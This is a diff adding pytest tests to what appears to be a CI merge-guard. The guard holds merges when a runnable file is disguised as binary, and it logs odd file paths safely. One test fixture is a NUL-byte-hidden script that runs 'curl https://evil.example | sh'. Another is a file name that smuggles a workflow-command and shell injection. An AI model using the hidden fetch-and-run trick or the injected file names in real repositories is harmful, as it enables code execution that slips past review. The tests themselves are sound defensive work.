@@ -351,3 +351,39 @@ def test_text_the_bases_gitattributes_shows_as_binary_holds_the_merge(repo, tmp_
     token = re.search(r"^::stop-commands::([0-9a-f]{32})$", log, re.M)[1]
     listed = log[log.index(f"::stop-commands::{token}"):log.index(f"::{token}::")]
     assert "  src/payload.dat" in listed and "  src/odd$(x).dat" in listed and "logo.png" not in listed
+
+
+def held(repo):
+    """The paths the step logged as held, between its stop-commands markers."""
+    token = re.search(r"^::stop-commands::([0-9a-f]{32})$", repo.log, re.M)
+    if not token:
+        return []
+    block = repo.log[repo.log.index(f"::stop-commands::{token[1]}"):repo.log.index(f"::{token[1]}::")]
+    return [line[2:] for line in block.splitlines()[1:]]
+
+
+def test_a_script_git_calls_binary_by_its_content_holds_the_merge(repo, tmp_path):
+    # A NUL byte in a comment makes git show the file as binary, and bash still runs it.
+    head = repo.commit({"scripts/deploy.sh": b"#!/bin/bash\n# \0\ncurl https://evil.example | sh\n"})
+    _, _, diff = repo.split(repo.base, head, tmp_path)
+    assert b"Binary files /dev/null and b/scripts/deploy.sh differ" in diff
+    assert repo.hidden == 1 and held(repo) == ["scripts/deploy.sh"]
+
+
+def test_a_binary_with_a_binary_files_extension_holds_nothing(repo, tmp_path):
+    repo.base = repo.commit({"old.bin": b"\0gone\n"})
+    head = repo.commit({"logo.png": b"\x89PNG\0\1\2", "lib/Tool.DLL": b"MZ\0\0", "old.bin": None})
+    _, _, diff = repo.split(repo.base, head, tmp_path)
+    assert diff.count(b"Binary files") == 3
+    # A deleted file leaves nothing to run, so it doesn't hold either.
+    assert repo.hidden == 0 and held(repo) == []
+
+
+def test_a_held_binarys_odd_path_is_logged_safely(repo, tmp_path):
+    odd = "x\n::error::pwned $(touch pwned)\t.bin"
+    head = repo.commit({odd: b"\0payload\n"})
+    repo.split(repo.base, head, tmp_path)
+    assert repo.hidden == 1 and not (repo.path / "pwned").exists()
+    # One line, with its newline and tab escaped, inside the stop-commands block.
+    assert held(repo) == ["x\\n::error::pwned $(touch pwned)\\t.bin"]
+    assert not re.search(r"^::error::", repo.log, re.M)
